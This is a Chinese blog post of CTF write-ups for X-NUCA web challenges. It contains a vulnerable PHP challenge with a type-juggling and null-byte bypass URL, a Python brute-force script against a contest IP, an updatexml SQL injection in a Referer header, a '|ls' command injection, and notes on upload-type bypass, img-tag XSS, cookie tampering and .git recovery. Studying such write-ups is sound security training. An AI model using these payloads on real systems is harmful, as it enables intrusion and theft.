---


title: X-NUCA Web练习题

time: 2016.07.24 15:22:00

layout: post

tags:

- Security
- CTF-Web

excerpt: Writeup about X-NUCA.

---
# X-NUCA  Web

## 1. Web4


```
<?php
show_source(__FILE__);
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET['foo']);
var_dump($a);
if(is_array($a)){
    echo 1;
    is_numeric(@$a["bar1"])?die("nope"):NULL;
    if(@$a["bar1"]){
        ($a["bar1"]>2016)?$v1=1:NULL;
    }
    if(is_array(@$a["bar2"])){
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        $pos = array_search("nudt", $a["a2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}
?>
本地测试程序：
	<?php
	show_source(__FILE__);
	$arr = array (
    	"bar1"=>"2017adsad",
    	"bar2"=>array(
        	"0"=>array(0),
        	"1"=>1,
        	"2"=>2,
        	"3"=>3,
        	"4"=>4,
    	),
    	"a2"=>"nudt",
    	"d"=>4,
    	"e"=>5);
	echo json_encode($arr);


	$v1=0;$v2=0;$v3=0;
	$a=(array)json_decode(@$_GET['foo']);
	var_dump($a);
	if(is_array($a)){
    	echo 'lever 1!';
    	is_numeric(@$a["bar1"])?die("nope"):NULL;
    	if(@$a["bar1"]){
        	($a["bar1"]>2016)?$v1=1:NULL;
    	}
    	if(is_array(@$a["bar2"])){
        	echo 'lever 2!';
        	var_dump($a["bar2"]);
        	echo(count($a["bar2"]));
        	if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        	echo 'lever 3!';
        	$pos = array_search("nudt", $a["a2"]);
        	$pos===false?die("nope"):NULL;
        	echo 'lever 4!';
        	foreach($a["bar2"] as $key=>$val){
            	$val==="nudt"?die("nope"):NULL;
        	}
        	$v2=1;
    	}
	}
	$c=@$_GET['cat'];
	$d=@$_GET['dog'];
	var_dump($c[1]);
	var_dump(strcmp($c[1],$d));
	var_dump($c[1]!==$d);
	var_dump((!strcmp($c[1],$d) && $c[1]!==$d));
	if(@$c[1]){
    	echo 'lever 5!';
    	if(!strcmp($c[1],$d) && $c[1]!==$d){
        	echo 'lever 6!';
        	eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        	echo 'lever 7!';
        	strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;

    	}
	}
	var_dump($v1);
	var_dump($v2);
	var_dump($v3);

	if($v1 && $v2 && $v3){
    	include "flag.php";
    	echo $flag;
	}

	?>
payload :
http://localhost:8888/sys/test.php?foo={"bar1":"2017adsad","bar2":[[0],1,2,3,4],"c":3,"d":4,"e":5}&&cat[1][]="1"&&dog=％00&&cat[0]="htctf2016"
```

------

## Web5


slash+3位数字

爆破一下

```
#!usr/bin/python
# -*- coding:utf-8 -*-
__Author__ = 'moxiaoxi'
__Filename__ = 'brute.py' 

'''
爆破
'''
import hashlib
from urllib import request
diction = {}
l = []
url = []
for x in range(10):
    diction[x]=str(x)

for x in range(10):
    for i in range(10):
        for j in range(10):
            l.append('slash'+diction[x]+diction[i]+diction[j]) 

for i in range(1000):
    md5 = hashlib.md5()
    md5.update(l[i].encode('utf-8'))
    url.append("http://218.76.35.75:20115/index.php?page="+md5.hexdigest())
    print("test %d "%i)
    with request.urlopen(url[i]) as test:
        if '文件不存在' not in test.read().decode('utf-8'):
            print('Yep, We got it ! test:%d:'%i+url[i])
            break
            
```
http://218.76.35.75:20115/index.php?page=b74d94c647115ba40b3acd8e12b4e122


----

## Web6

Referer: http://218.76.35.75:20121/'+(updatexml(1,concat(0x3a,(select (select flag from flag))),1))+'1

-----
## Web7

上传一个PHP文件，然后用burpsuite改下类型 就可以了



-----
## Web8

把JS编译一下，查看源码就能看到

访问一下，有个cookie，就是flag


----
## Web 9

http://218.76.35.75:20124/index.php?heetian=he=abcd

----
## Web10 
描述：alert document.domain

闭合以后，用img标签XSS

----
## Web 11

无聊的题目

http://218.76.35.75:20126/index.php?page=/flag
得到flag位置
flag: 62a72cb2f3d5e7fc0284da9f21e66c9f.php

访问一下 就得到了 guess 573

完全不能叫做文件包含。

---
## Web12
又一道爆破题
 
cookie 那边 user改成admin

guess 用burpsuite爆破一下

就出来最终结果

----
## Web15 

使用|绕过
127.0.0.1｜ls

可以得到
3f83e03a1e4e65573ef11cca25048808  css  footer.php  header.php  index.php

访问下http://218.76.35.75:20105/3f83e03a1e4e65573ef11cca25048808/得到flag

----
## Web 17

```
POST / HTTP/1.1
Host: 218.76.35.74:65280
Content-Length: 13
Cache-Control: max-age=0
Origin: http://218.76.35.74:65280
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://www.iie.ac.cn 
X-Forwarded-For:10.10.20.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Connection: close

password=cafe
```

----
## Web 19

一开始用githack恢复，没找到点

后来发现这题的关键是需要拿到git参数文件

就是得拿到git配置文件

用rip-git.pl 抓取文件

然后，git log 一下 可以发现有两个记录

git reset --hard 570fa7812efa63a398471e48d51bf24eeaa99358(init)

再查看hack.php就找到了flag

----
# 参考：
1. 比赛题目：http://www.hetianlab.com/pages/activity/X-NUCANationalTL.jsp